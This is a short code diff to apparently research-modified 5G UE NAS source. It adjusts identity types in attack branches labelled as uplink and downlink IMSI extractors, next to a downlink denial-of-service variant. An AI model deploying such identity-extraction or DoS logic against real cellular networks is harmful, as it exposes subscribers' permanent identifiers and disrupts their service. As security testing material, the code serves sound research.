@@ -448,8 +448,7 @@ void generateRegistrationRequest(as_nas_info_t *initialNasMsg, nr_ue_nas_t *nas)
     // fill invalid S-TMSI
     LOG_E(NAS, "[Uplink IMSI Extractor] Variant 1: encoding invalid TMSI into registration message\n");
     FGSMobileIdentity *mi = &mm_msg->registration_request.fgsmobileidentity;
-    mi->stmsi.typeofidentity = FGS_MOBILE_IDENTITY_5GS_TMSI;
-    mi->stmsi.digit1      = 0;
+    mi->guti.typeofidentity = FGS_MOBILE_IDENTITY_5G_GUTI;
     mi->stmsi.spare       = 0;
     mi->stmsi.amfsetid    = 0;
     mi->stmsi.amfpointer  = 0;
@@ -1084,7 +1083,7 @@ void *nas_nrue_task(void *args_p)
               }
               else if (dnlnk_imsi_extract == 1) {
                 LOG_E(NAS, "[Downlink IMSI Extractor] Variant 1: replacing Authentication Request with Identity Request (IMSI)\n");
-                generateIdentityResponse(&initialNasMsg, *(pdu_buffer + 3), nas->uicc); // handle it as an identity request
+                generateIdentityResponse(&initialNasMsg, FGS_MOBILE_IDENTITY_SUCI, nas->uicc); // handle it as an identity request
               }
               else if (dnlink_dos_attack == 1) {
                 LOG_E(NAS, "[Downlink DoS] Variant 1: Replacing Authentication Request with Registration Reject\n");
